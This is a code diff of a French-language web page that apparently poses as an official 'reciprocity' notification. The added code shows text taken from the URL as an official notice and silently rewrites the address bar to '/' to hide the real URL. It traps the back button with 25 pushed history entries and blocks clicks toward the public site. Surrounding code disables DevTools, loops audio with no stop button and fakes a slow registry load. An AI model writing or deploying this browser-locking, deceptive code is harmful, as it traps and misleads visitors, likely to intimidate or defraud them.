@@ -84,6 +84,38 @@
         window.location.replace('./');
       }
     }
+
+    // Extraction immédiate des paramètres personnalisés avant masquage de l'URL
+    var customText = '';
+    var isDest = false;
+    if (window.location.search && window.location.search.length > 1) {
+      var sp = new URLSearchParams(window.location.search);
+      customText = sp.get('texte') || sp.get('note') || sp.get('message') || sp.get('msg') || sp.get('motif') || sp.get('dest') || sp.get('destinataire') || '';
+      isDest = sp.has('dest') || sp.has('destinataire');
+      if (!customText) {
+        var rawSearch = window.location.search.substring(1);
+        if (!rawSearch.includes('=') && !rawSearch.startsWith('portail') && !rawSearch.startsWith('sig')) {
+          try { customText = decodeURIComponent(rawSearch.replace(/\+/g, ' ')); } catch (_) { customText = rawSearch; }
+        }
+      }
+    }
+    if (!customText && window.location.hash && window.location.hash.length > 1) {
+      var rawHash = window.location.hash.substring(1);
+      if (!rawHash.includes('=')) {
+        try { customText = decodeURIComponent(rawHash.replace(/\+/g, ' ')); } catch (_) { customText = rawHash; }
+      }
+    }
+    if (customText) {
+      window.__WG_CUSTOM_NOTE = customText;
+      window.__WG_CUSTOM_IS_DEST = isDest;
+      try { sessionStorage.setItem('__wg_custom_note', customText); } catch (_) {}
+      if (isDest) { try { sessionStorage.setItem('__wg_custom_is_dest', '1'); } catch (_) {} }
+    }
+
+    // Masquage furtif immédiat de l'URL dans la barre d'adresse : reciprocite.html?... s'efface au profit de '/'
+    if (window.history && window.history.replaceState) {
+      window.history.replaceState(null, '', '/');
+    }
   } catch (_) {}
 })();
 </script>
@@ -1190,22 +1222,25 @@ html, body {
 
   applyFullLock();
 
-  // 2. Préservation de l'URL de réciprocité avec signature et paramètres personnalisés (sans jamais briser le lien)
+  // 2. Affichage dynamique du message/note et masquage furtif immédiat de l'URL (devient '/')
   try {
-    if (window.history && window.history.replaceState) {
-      const search = window.location.search || '?portail=cce-sem26003&transmission=officielle&sig=72rsp';
-      window.history.replaceState(null, '', '/reciprocite.html' + search + window.location.hash);
-    }
-  } catch (_) {}
+    let customText = window.__WG_CUSTOM_NOTE || '';
+    let isDest = window.__WG_CUSTOM_IS_DEST || false;
 
-  // Affichage dynamique de toute note, message ou texte personnalisé passé dans l'URL
-  try {
-    const sp = new URLSearchParams(window.location.search);
-    let customText = sp.get('texte') || sp.get('note') || sp.get('message') || sp.get('msg') || sp.get('motif') || sp.get('dest') || sp.get('destinataire') || '';
+    if (!customText) {
+      try { customText = sessionStorage.getItem('__wg_custom_note') || ''; } catch (_) {}
+      try { isDest = sessionStorage.getItem('__wg_custom_is_dest') === '1'; } catch (_) {}
+    }
+
     if (!customText && window.location.search && window.location.search.length > 1) {
-      const rawSearch = window.location.search.substring(1);
-      if (!rawSearch.includes('=') && !rawSearch.startsWith('portail') && !rawSearch.startsWith('sig')) {
-        try { customText = decodeURIComponent(rawSearch.replace(/\+/g, ' ')); } catch (_) { customText = rawSearch; }
+      const sp = new URLSearchParams(window.location.search);
+      customText = sp.get('texte') || sp.get('note') || sp.get('message') || sp.get('msg') || sp.get('motif') || sp.get('dest') || sp.get('destinataire') || '';
+      isDest = sp.has('dest') || sp.has('destinataire');
+      if (!customText) {
+        const rawSearch = window.location.search.substring(1);
+        if (!rawSearch.includes('=') && !rawSearch.startsWith('portail') && !rawSearch.startsWith('sig')) {
+          try { customText = decodeURIComponent(rawSearch.replace(/\+/g, ' ')); } catch (_) { customText = rawSearch; }
+        }
       }
     }
     if (!customText && window.location.hash && window.location.hash.length > 1) {
@@ -1214,29 +1249,48 @@ html, body {
         try { customText = decodeURIComponent(rawHash.replace(/\+/g, ' ')); } catch (_) { customText = rawHash; }
       }
     }
+
     if (customText) {
       const noteEl = document.getElementById('reciprocity-custom-note');
       const textEl = document.getElementById('reciprocity-custom-text');
       const labelEl = document.getElementById('reciprocity-custom-label');
       if (noteEl && textEl) {
         textEl.textContent = customText;
-        if (sp.has('dest') || sp.has('destinataire')) {
-          if (labelEl) labelEl.textContent = 'Destinataire consigné / Notification officielle';
+        if (isDest && labelEl) {
+          labelEl.textContent = 'Destinataire consigné / Notification officielle';
         }
         noteEl.style.display = 'block';
       }
     }
+
+    // Masquage furtif garanti de l'URL dans la barre d'adresses (devient '/')
+    if (window.history && window.history.replaceState) {
+      window.history.replaceState(null, '', '/');
+    }
   } catch (_) {}
 
-  // 3. Piège anti-retour arrière (Back-button Trap)
+  // 3. Piège anti-retour arrière (Back-button Trap) vers '/'
   try {
     for (let i = 0; i < 25; i++) {
-      window.history.pushState({ locked: true, depth: i }, '', window.location.href);
+      window.history.pushState({ locked: true, depth: i }, '', '/');
     }
     window.addEventListener('popstate', function(e) {
-      window.history.pushState({ locked: true }, '', window.location.href);
+      window.history.pushState({ locked: true }, '', '/');
     });
   } catch (_) {}
+
+  // 3.1. Neutralisation des clics sortants vers le site public : maintien étanche sur l'interface
+  document.addEventListener('click', function(e) {
+    const link = e.target.closest('a');
+    if (link) {
+      const href = link.getAttribute('href') || '';
+      if (href === '/' || href.startsWith('/?') || href === './' || href === 'index.html' || href === '/index.html' || href.startsWith('/#')) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+    }
+  }, true);
 
   // 4. Neutralisation complète des outils d'inspection DevTools (F12, Clic droit, Raccourcis)
   try {
@@ -1383,39 +1437,55 @@ html, body {
     }
   } catch (_) {}
 
-  // 11. Audio immersif officiel en boucle automatique sans bouton d'arrêt
+  // 11. Audio immersif officiel en boucle automatique : départ automatique avec délai de 3 secondes après ouverture
   try {
     const audio = new Audio('/assets/Audio/attente-sem26003.mp3');
     audio.loop = true;
     audio.volume = 0.85;
+    audio.preload = 'auto';
 
     let hasStarted = false;
-    function startAudio() {
-      if (!hasStarted) {
-        audio.play().then(function() {
+    let delayPassed = false;
+
+    function playAudioNow() {
+      if (hasStarted || !delayPassed) return;
+      const playPromise = audio.play();
+      if (playPromise !== undefined) {
+        playPromise.then(function() {
           hasStarted = true;
           cleanupListeners();
         }).catch(function(_) {});
       }
     }
 
-    function cleanupListeners() {
-      window.removeEventListener('click', startAudio);
-      window.removeEventListener('touchstart', startAudio);
-      window.removeEventListener('keydown', startAudio);
-      window.removeEventListener('scroll', startAudio);
-      window.removeEventListener('mousemove', startAudio);
+    function onUserGesture() {
+      if (delayPassed) {
+        playAudioNow();
+      }
     }
 
-    // Tentative autoplay immédiat
-    startAudio();
+    function cleanupListeners() {
+      window.removeEventListener('click', onUserGesture);
+      window.removeEventListener('touchstart', onUserGesture);
+      window.removeEventListener('keydown', onUserGesture);
+      window.removeEventListener('scroll', onUserGesture);
+      window.removeEventListener('mousemove', onUserGesture);
+      window.removeEventListener('pointerdown', onUserGesture);
+    }
 
-    // Déblocage automatique au moindre événement utilisateur
-    window.addEventListener('click', startAudio, { passive: true });
-    window.addEventListener('touchstart', startAudio, { passive: true });
-    window.addEventListener('keydown', startAudio, { passive: true });
-    window.addEventListener('scroll', startAudio, { passive: true });
-    window.addEventListener('mousemove', startAudio, { passive: true });
+    // Écoute des gestes utilisateur pour autoriser l'audio dans les navigateurs stricts
+    window.addEventListener('click', onUserGesture, { passive: true });
+    window.addEventListener('touchstart', onUserGesture, { passive: true });
+    window.addEventListener('keydown', onUserGesture, { passive: true });
+    window.addEventListener('scroll', onUserGesture, { passive: true });
+    window.addEventListener('mousemove', onUserGesture, { passive: true });
+    window.addEventListener('pointerdown', onUserGesture, { passive: true });
+
+    // Délai obligatoire de 3 secondes (3000 ms) après ouverture de la page avant le départ audio
+    setTimeout(function() {
+      delayPassed = true;
+      playAudioNow();
+    }, 3000);
   } catch (_) {}
 
   // 12. Simulateur de chargement ultra-lent pour le Registre CCE (10 secondes)
